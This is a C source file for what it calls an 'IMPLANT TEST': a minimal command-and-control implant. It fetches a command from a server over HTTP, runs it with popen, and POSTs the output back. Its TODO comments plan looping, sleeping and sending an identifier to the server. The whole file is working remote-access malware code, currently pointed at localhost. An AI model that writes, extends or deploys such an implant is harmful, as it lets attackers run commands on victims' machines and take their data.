#include <stdio.h>
#include <string.h>
#include <curl/curl.h>
#include <unistd.h>
#include <stdlib.h>

// FIX CHECK TO SEE IF COMMAND IS EMPTY
// ADD LOOP, SLEEP ECT
// ADD FEATURE TO CHECK IF THIS IS FIRST TIME RUNNING
// ADD FEATURE TO SEND IDENTIFIER TO SERVER


#define BUFFER_SIZE 4096

struct memory {
    char *response;
    size_t size;
};


// Function Lcurl Will Use save data (stolen straight from Libcurl Docs)
static size_t cb(char *data, size_t size, size_t nmemb, void *clientp) {
    size_t realsize = size * nmemb;
    struct memory *mem = (struct memory *)clientp;

    // Reallocate memory for the response
    char *ptr = realloc(mem->response, mem->size + realsize + 1);
    if (!ptr) {
        return 0;  /* Out of memory! */
    }

    mem->response = ptr;
    memcpy(&(mem->response[mem->size]), data, realsize);
    mem->size += realsize;
    mem->response[mem->size] = 0;

    return realsize;
}

char* get_command(char* url) {
	CURL *curl;
	CURLcode res;
	char* command_to_run = malloc(1);
	struct memory chunk = {0};
	if (command_to_run == NULL) {
       fprintf(stderr, "Failed to allocate memory\n");
       return NULL;
    }

    chunk.size = 0;

	curl_global_init(CURL_GLOBAL_DEFAULT);
	curl = curl_easy_init();

	command_to_run[0] = '\0';

	if(curl) {
		curl_easy_setopt(curl, CURLOPT_URL, url);
		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, cb);
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, &chunk);
		res = curl_easy_perform(curl);

		if (res != CURLE_OK) {
            fprintf(stderr, "Request failed: %s\n", curl_easy_strerror(res));
            free(command_to_run);
            command_to_run = NULL;
        }

		curl_easy_cleanup(curl);
	}

	curl_global_cleanup();

	return chunk.response;
}

int send_command(char* data, char* url) {
	CURL* curl;
	CURLcode res;
	char send_data[BUFFER_SIZE];

	// Create the POST Body (output=zevuxo)
	snprintf(send_data, sizeof(send_data), "output=%s", data);
	printf("%s\n", send_data);

	curl_global_init(CURL_GLOBAL_DEFAULT);
	curl = curl_easy_init();

	if(curl) {
		printf("Preparing To Send POST Request\n");
		curl_easy_setopt(curl, CURLOPT_URL, url);
		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, send_data);

		res = curl_easy_perform(curl);

		if(res != CURLE_OK) {
			fprintf(stderr, "POST FAILED");
			curl_easy_cleanup(curl);
			return 0;
		}

	}

	curl_global_cleanup();
	return 0;
}	


char* run_command(char* command, char* output) {
	FILE* f;
	char buffer[BUFFER_SIZE];
	size_t len = 0;

	output[0] = '\0';

	f = popen(command, "r");

	if (f == NULL) {
		fprintf(stderr, "popen Failed\n");
		return NULL;
	}

	while(fgets(buffer, sizeof(buffer), f) != NULL) {
		if(len + strlen(buffer) < BUFFER_SIZE - 1) {
			strcat(output, buffer);
			len += strlen(buffer);
		}else {
			fprintf(stderr, "Buffer Will OverFlow");
			return NULL;
		}
		
	}
	pclose(f);

}


int main(int argc, char* argv[]){
	printf("IMPLANT TEST\n");
	char command[BUFFER_SIZE];
	char output[BUFFER_SIZE];

	printf("Getting Command To Run...\n");
	char* command_to_run = get_command("http://127.0.0.1/get_command");

	if(command_to_run == NULL || strcmp(command_to_run, "Nope") == 0) {
		fprintf(stderr, "Failed To Get Command...");
		return 1;
	}
	
	printf("%s\n", command_to_run);

	run_command(command_to_run, output);
	printf("%s\n", output);
	
	send_command(output, "http://127.0.0.1/send_command");
	

	return 0;
}
